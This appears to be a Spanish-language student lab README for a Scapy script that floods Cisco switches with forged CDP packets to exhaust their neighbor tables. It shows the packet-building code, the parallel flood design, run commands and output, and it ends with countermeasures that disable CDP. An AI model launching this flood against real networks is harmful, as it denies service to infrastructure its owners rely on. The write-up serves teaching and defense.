<div align="center">

# 📡 CDP DoS Attack

**Luiggy Habraham Encarnación Cabrera · Matrícula 2025-0663**

![Python](https://img.shields.io/badge/Python-3.10%2B-3776AB?style=for-the-badge&logo=python&logoColor=white)
![Platform](https://img.shields.io/badge/Platform-Kali%20Linux-557C94?style=for-the-badge&logo=linux&logoColor=white)
![Scapy](https://img.shields.io/badge/Library-Scapy-FF6F00?style=for-the-badge)
![GNS3](https://img.shields.io/badge/Simulator-GNS3-009639?style=for-the-badge)
![License](https://img.shields.io/badge/Uso-Educativo-blue?style=for-the-badge)

> Denegación de servicio mediante inundación masiva de paquetes CDP falsificados contra dispositivos Cisco, saturando su tabla de vecinos y degradando su rendimiento.

</div>

---

## ⚠️ Aviso Legal

> [!CAUTION]
> Este repositorio tiene fines **exclusivamente académicos y educativos**.
> Todo el contenido fue ejecutado en un entorno de laboratorio virtualizado y controlado.
> La reproducción de estas técnicas en redes sin autorización expresa es **ilegal**.

---

## 📑 Tabla de Contenido

1. [Objetivo del Laboratorio](#-objetivo-del-laboratorio)
2. [Objetivo del Script](#-objetivo-del-script)
3. [Requisitos](#requisitos-para-utilizar-la-herramienta)
4. [Instalación](#️-instalación)
5. [Documentación de la Red](#️-documentación-de-la-red)
6. [Funcionamiento del Script](#-funcionamiento-del-script)
7. [Uso y Ejecución](#-uso-y-ejecución)
8. [Contramedidas](#-contramedidas)
9. [Capturas de Pantalla](#-capturas-de-pantalla)
10. [Video de Demostración](#-video-de-demostración)

---

## 🎯 Objetivo del Laboratorio

Demostrar cómo un atacante posicionado en la misma red de Capa 2 puede explotar la ausencia de autenticación en el protocolo CDP (*Cisco Discovery Protocol*) para saturar la tabla de vecinos de un switch o router Cisco. El ataque genera una denegación de servicio (DoS) en el plano de control del dispositivo, consumiendo memoria y CPU de forma anormal.

---

## 🧩 Objetivo del Script

El script `cdp_dos_attack.py` genera y envía de forma masiva y paralela paquetes CDP falsificados hacia la dirección multicast `01:00:0c:cc:cc:cc`. Cada paquete contiene un `Device ID`, plataforma y versión de IOS aleatorios, haciendo que el dispositivo objetivo registre cada paquete como un vecino distinto hasta agotar la capacidad de su tabla CDP.

### Parámetros Usados

| Parámetro | Tipo | Descripción | Ejemplo |
|---|---|---|---|
| Interfaz de red | Interactivo | Interfaz desde la que se lanza el ataque | `e0` |
| `BATCH_SIZE` | Constante en código | Paquetes enviados por worker por ciclo | `100` |
| `NUM_WORKERS` | Automático | Workers paralelos = núcleos de CPU disponibles | `4` |

### Requisitos para Utilizar la Herramienta

| Requisito | Detalle |
|---|---|
| Sistema operativo | Kali Linux 2023+ (o cualquier Linux) |
| Python | 3.10 o superior |
| Librería Scapy | `scapy >= 2.5.0` (incluye `scapy.contrib.cdp`) |
| Privilegios | `sudo` o `root` obligatorio |
| Conectividad | Capa 2 activa con el dispositivo objetivo |
| CDP activo | El switch/router objetivo debe tener CDP habilitado |

---

## ⚙️ Instalación

```bash
# 1. Clonar el repositorio
git clone https://github.com/luiggyencarnacion/CDP-DoS-Attack.git
cd CDP-DoS-Attack

# 2. Crear entorno virtual
python3 -m venv venv
source venv/bin/activate

# 3. Instalar dependencias
pip install -r requirements.txt

# 4. Verificar Scapy
python3 -c "from scapy.contrib.cdp import *; print('CDP module OK')"
```

**`requirements.txt`**
```
scapy>=2.5.0
```

---

## 🗺️ Documentación de la Red

### Topología

```
                    ┌─────────┐
                    │   R-1   │  10.6.63.1/24
                    └────┬────┘
                         │ Gig0/0
                         │ Gig0/0
                    ┌────┴────┐
                    │  SW-1   │  ← Objetivo del ataque CDP
                    └──┬───┬──┘
               Gig0/2  │   │  Gig0/1
              ┌────────┘   └───────────┐
         ┌────┴────────┐          ┌────┴───────┐
         │ KaliLinux-1 │          │    PC1     │
         │  Atacante   │          │  Víctima   │
         │ 10.6.63.13  │          │ 10.6.63.50 │
         └─────────────┘          └────────────┘
               e0                      e0
```

![Topología GNS3](images/01_topologia_gns3.png)

### Tabla de Direccionamiento

| Dispositivo | Interfaz | Dirección IP | Máscara | Rol |
|---|---|---|---|---|
| R-1 | g0/0 | 10.6.63.1 | /24 | Gateway / Objetivo CDP |
| SW-1 | Gig0/0 | — | — | Switch objetivo (tabla CDP) |
| SW-1 | Gig0/1 | — | — | Enlace hacia PC1 |
| SW-1 | Gig0/2 | — | — | Enlace hacia KaliLinux-1 |
| KaliLinux-1 | e0 | 10.6.63.13 | /24 | Atacante |
| PC1 | e0 | 10.6.63.50 | /24 | Víctima simulada (VPCS) |

### Detalles del Entorno

| Parámetro | Valor |
|---|---|
| Red | 10.6.63.0/24 |
| Emulador | GNS3 |
| Plataforma atacante | Kali Linux |
| Dispositivos Cisco | IOU (IOS on Unix) |
| VLANs | VLAN 1 (default) |

---

## 🔬 Funcionamiento del Script

### Flujo General

```
Inicio
  └── Selección interactiva de interfaz
        └── Lanzamiento de N workers (multiprocessing, 1 por núcleo CPU)
              ├── Worker 1..N:
              │     └── Generar lote de 100 paquetes CDP aleatorios
              │     └── sendp(lote, iface, verbose=False)
              │     └── counter += 100  (lock compartido)
              │     └── Repetir ∞
              └── Proceso Monitor:
                    └── Cada 5s: leer counter → imprimir stats
  └── Ctrl+C → Resumen Final → terminar procesos
```

### Construcción del Paquete CDP

```python
Ether(src=random_mac(), dst="01:00:0c:cc:cc:cc")
/ LLC(dsap=0xaa, ssap=0xaa, ctrl=0x03)
/ SNAP(OUI=0x00000c, code=0x2000)
/ CDPv2_HDR(vers=2, ttl=180)
/ CDPMsgDeviceID(val=device_id)           # 16 chars aleatorios
/ CDPMsgSoftwareVersion(val="Cisco IOS Version 12.x.x")
/ CDPMsgPlatform(val="cisco WS-C3750")    # modelo aleatorio
/ CDPMsgCapabilities(cap=random)
/ CDPMsgPortID(iface="GigabitEthernet0/x")
```

Cada MAC de origen única + Device ID único → el switch registra una nueva entrada en su tabla CDP, consumiendo memoria de forma progresiva.

### Salida en Tiempo Real

```
  Tiempo       Total          Rate       Workers
  ──────────────────────────────────────────────
  00:05      2,400        480 pkt/s      4 cores
  00:10      5,100        540 pkt/s      4 cores
  00:15      7,800        560 pkt/s      4 cores
```

---

## 🚀 Uso y Ejecución

```bash
sudo python3 cdp_dos_attack.py
```

**Interacción esperada:**

```
  Interfaces de red disponibles:
    [1] lo
    [2] e0

  Seleccione interfaz (número o nombre): 2

  ╔════════════════════════════════════════╗
  ║            CDP DoS Attack              ║
  ╚════════════════════════════════════════╝
  Interfaz : e0
  Workers  : 4 cores
  Batch    : 100 pkt/worker
```

**Verificación en el dispositivo objetivo:**

```
SW-1# show cdp neighbors
SW-1# show processes cpu
SW-1# show logging
SW-1# clear cdp table
SW-1# clear cdp counters
```

---

## 🔐 Contramedidas

### Opción 1 — Deshabilitar CDP por puerto (recomendado)

```
SW-1(config)# interface GigabitEthernet0/2
SW-1(config-if)# no cdp enable
SW-1(config-if)# exit
```

### Opción 2 — Deshabilitar CDP globalmente

```
SW-1(config)# no cdp run
```

### Verificación

```
SW-1# show cdp neighbors
SW-1# show cdp interface GigabitEthernet0/2
```

### Tabla Resumen

| Contramedida | Efectividad | Impacto operacional |
|---|---|---|
| `no cdp enable` por interfaz | Muy alta | Bajo |
| `no cdp run` global | Muy alta | Medio |

---

## 📸 Capturas de Pantalla

```
evidencias/
├── 01_topologia_gns3.png
├── 02_ataque_en_ejecucion.png
├── 03_show_cdp_neighbors_saturado.png
├── 04_show_processes_cpu.png
├── 05_contramedida_aplicada.png
└── 06_verificacion_mitigacion.png
```

---

## 🎬 Video de Demostración

> 📺 **[Ver demostración en YouTube →](https://youtu.be/iSnmOQYDf_E?si=jYIY0wwXAigdCu2D)**
---

<div align="center">

*Documento elaborado con fines académicos en un entorno de laboratorio controlado.*
*El uso de estas técnicas fuera de entornos autorizados es ilegal.*

</div>
